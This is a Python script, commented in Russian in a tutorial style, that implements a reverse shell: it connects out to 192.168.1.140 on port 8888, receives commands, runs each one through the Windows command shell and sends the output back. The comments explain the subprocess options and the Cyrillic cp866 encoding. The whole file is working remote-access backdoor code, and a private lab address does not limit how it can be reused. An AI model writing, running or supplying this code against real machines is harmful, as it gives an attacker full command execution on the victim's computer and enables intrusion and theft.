import socket
import subprocess

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('192.168.1.140', 8888))
while True:
    command = s.recv(4096).decode()
    if command == 'exit':
        break
    # subprocess.run — запускает системную команду и возвращает объект с результатом выполнения
    result = subprocess.run(

        command,
        # command — строка с командой, которую нужно выполнить
        # например: "dir", "ipconfig", "whoami", "notepad.exe"

        shell=True,
        # shell=True — команда будет выполнена через командную оболочку (cmd.exe на Windows)
        # это позволяет использовать встроенные команды Windows: dir, cd, echo и т.д.
        # без shell=True команды типа "dir" работать не будут

        capture_output=True,
        # capture_output=True — Python перехватывает вывод команды
        # сохраняет:
        # result.stdout — обычный вывод
        # result.stderr — вывод ошибок
        # иначе вывод просто появился бы на компьютере клиента и не вернулся бы в программу

        encoding="cp866",
        # encoding="cp866" — указывает Python, как правильно декодировать вывод Windows
        # cmd.exe использует cp866 (кириллица)
        # без этого будут "кракозябры"

        errors="ignore"
        # errors="ignore" — игнорирует символы, которые не удалось декодировать
        # предотвращает crash программы из-за ошибок кодировки
    )

    # result — это объект с информацией о выполнении команды
    # он содержит:

    # result.stdout — стандартный вывод (например список файлов)
    # result.stderr — ошибки (например "команда не найдена")
    # result.returncode — код возврата (0 = успешно, не 0 = ошибка)

    # объединяем обычный вывод и ошибки в одну строку
    output = result.stdout + result.stderr
    # если программа ничего не вывела
    if not output:
        output = "[OK] Команда была выполнена"
    s.send(output.encode("cp866", errors="ignore"))
s.close()